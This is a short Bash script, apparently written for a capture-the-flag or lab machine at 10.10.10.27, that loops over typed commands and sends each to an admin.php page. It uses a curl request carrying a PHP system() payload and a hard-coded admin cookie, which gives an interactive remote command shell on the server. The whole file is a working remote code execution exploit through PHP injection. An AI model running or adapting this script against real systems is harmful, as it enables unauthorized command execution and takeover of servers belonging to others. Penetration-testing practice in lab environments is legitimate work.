#!/bin/bash

function ctrl_c(){
    echo -e "\n\n[!] Saliendo...\n"
    exit 1
}

# Ctrl+C
trap ctrl_c INT

# Variables globales
main_url="http://10.10.10.27/admin.php"

while true; do
    echo -n "[~] " && read -r command
    echo; curl -s -G $main_url --data-urlencode "html=<?php system(\"$command\"); ?>" --cookie "adminpowa=noonecares" | grep "\/body" -A 500 | grep -v "\/body"; echo
done
